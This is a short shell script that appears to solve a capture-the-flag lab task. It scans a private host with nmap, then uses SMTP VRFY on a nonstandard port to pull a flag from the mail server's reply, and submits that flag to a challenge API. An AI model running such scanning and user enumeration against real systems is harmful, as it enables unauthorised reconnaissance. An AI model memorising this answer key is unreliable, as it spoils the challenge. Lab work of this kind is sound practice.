#!/bin/sh
set -eu

nmap -Pn -sV -p 22,5900,2121,2323,8080,25252 172.20.0.141
flag=$(python3 - <<'PY'
import re
import socket

host, port = "172.20.0.141", 25252
with socket.create_connection((host, port), timeout=5) as sock:
    stream = sock.makefile("rwb", buffering=0)
    stream.readline()  # SMTP greeting
    stream.write(b"EHLO terminal\r\n")
    while True:
        line = stream.readline()
        if not line or len(line) < 4 or line[3:4] != b"-":
            break
    stream.write(b"VRFY archivist\r\n")
    response = stream.readline()
match = re.search(rb"BSY\{[^}\r\n]+\}", response)
if not match:
    raise SystemExit("The mailbox response did not contain a flag")
print(match.group(0).decode())
PY
)
curl -s http://172.20.0.3/api/challenges/submit -X POST -H 'Content-Type: application/json' \
  --data-binary "{\"challenge_id\":\"scl-challenge-frame-80014a\",\"task_id\":\"task1\",\"flag\":\"${flag}\"}"
